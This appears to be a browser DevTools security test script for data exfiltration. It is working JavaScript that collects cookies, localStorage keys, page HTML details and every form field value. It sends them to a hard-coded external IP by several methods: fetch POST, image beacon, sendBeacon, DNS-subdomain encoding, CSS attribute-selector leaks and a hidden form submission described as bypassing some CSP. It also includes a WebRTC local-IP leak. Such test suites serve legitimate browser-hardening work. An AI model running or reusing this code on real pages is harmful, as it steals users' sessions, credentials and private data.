// =============================================================
// TEST 08: Data Exfiltration Techniques from DevTools
// =============================================================

var EXFIL_SERVER = 'https://158.101.104.214/collect.php';

// --- Test 8.1: Fetch POST exfil ---
fetch(EXFIL_SERVER + '?cat=devtools&test=fetch-exfil', {
    method: 'POST',
    headers: {'Content-Type': 'application/json'},
    body: JSON.stringify({method: 'fetch', cookies: document.cookie, url: location.href}),
    mode: 'no-cors'
}).then(function() { console.log('[TEST 8.1] Fetch exfil: SENT'); })
.catch(function(e) { console.log('[TEST 8.1] Fetch exfil BLOCKED:', e.message); });

// --- Test 8.2: Image beacon exfil ---
var imgBeacon = new Image();
imgBeacon.src = EXFIL_SERVER + '?cat=devtools&test=img-beacon&data=' + encodeURIComponent(document.cookie);
console.log('[TEST 8.2] Image beacon sent');

// --- Test 8.3: sendBeacon exfil ---
try {
    navigator.sendBeacon(EXFIL_SERVER + '?cat=devtools&test=sendbeacon',
        JSON.stringify({cookies: document.cookie, storage_keys: Object.keys(localStorage)}));
    console.log('[TEST 8.3] sendBeacon: SENT');
} catch(e) { console.log('[TEST 8.3] sendBeacon BLOCKED:', e.message); }

// --- Test 8.4: DNS exfil simulation (encode data in subdomain) ---
var encoded = btoa(document.cookie || 'no-cookies').replace(/[^a-z0-9]/gi, '').substring(0, 60);
var dnsImg = new Image();
dnsImg.src = 'https://' + encoded + '.dns-exfil-test.example.com/pixel.gif';
console.log('[TEST 8.4] DNS exfil attempt:', encoded + '.dns-exfil-test.example.com');

// --- Test 8.5: WebRTC local IP leak ---
try {
    var pc = new RTCPeerConnection({iceServers: [{urls: 'stun:stun.l.google.com:19302'}]});
    pc.createDataChannel('');
    pc.createOffer().then(function(offer) {
        pc.setLocalDescription(offer);
    });
    pc.onicecandidate = function(e) {
        if (e.candidate) {
            var ip = e.candidate.candidate.match(/(\d{1,3}\.){3}\d{1,3}/);
            if (ip) console.log('[TEST 8.5] LOCAL IP LEAKED via WebRTC:', ip[0]);
        }
    };
    setTimeout(function() { pc.close(); }, 5000);
} catch(e) { console.log('[TEST 8.5] WebRTC BLOCKED:', e.message); }

// --- Test 8.6: CSS exfil (attribute value leak) ---
var cssExfil = document.createElement('style');
// This leaks input values character by character via CSS selectors
cssExfil.textContent = `
    input[value^="a"] { background: url("${EXFIL_SERVER}?cat=devtools&test=css-exfil&char=a"); }
    input[value^="b"] { background: url("${EXFIL_SERVER}?cat=devtools&test=css-exfil&char=b"); }
    input[value^="p"] { background: url("${EXFIL_SERVER}?cat=devtools&test=css-exfil&char=p"); }
    input[value^="s"] { background: url("${EXFIL_SERVER}?cat=devtools&test=css-exfil&char=s"); }
`;
document.head.appendChild(cssExfil);
console.log('[TEST 8.6] CSS exfil stylesheet injected — leaks input value prefixes');

// --- Test 8.7: Exfil page content ---
var pageData = {
    title: document.title,
    url: location.href,
    html_length: document.documentElement.innerHTML.length,
    forms: [],
    links: [],
    scripts: []
};
document.querySelectorAll('form').forEach(function(f) {
    pageData.forms.push({action: f.action, method: f.method, fields: Array.from(f.elements).map(function(e) { return {name: e.name, type: e.type, value: e.value}; })});
});
document.querySelectorAll('a').forEach(function(a) { pageData.links.push(a.href); });
document.querySelectorAll('script[src]').forEach(function(s) { pageData.scripts.push(s.src); });
console.log('[TEST 8.7] Page data collected:', JSON.stringify(pageData).substring(0, 500));
fetch(EXFIL_SERVER + '?cat=devtools&test=page-exfil', {method:'POST',mode:'no-cors',body:JSON.stringify(pageData)}).catch(function(){});

// --- Test 8.8: Exfil via form submission (bypasses some CSP) ---
var exfilForm = document.createElement('form');
exfilForm.method = 'POST';
exfilForm.action = EXFIL_SERVER + '?cat=devtools&test=form-exfil';
exfilForm.target = '_blank'; // opens in new tab to not lose current page
var dataInput = document.createElement('input');
dataInput.type = 'hidden';
dataInput.name = 'data';
dataInput.value = JSON.stringify({cookies: document.cookie, url: location.href});
exfilForm.appendChild(dataInput);
exfilForm.style.display = 'none';
document.body.appendChild(exfilForm);
// exfilForm.submit(); // Uncomment to test — will open new tab
console.log('[TEST 8.8] Exfil form ready — uncomment submit() to fire');
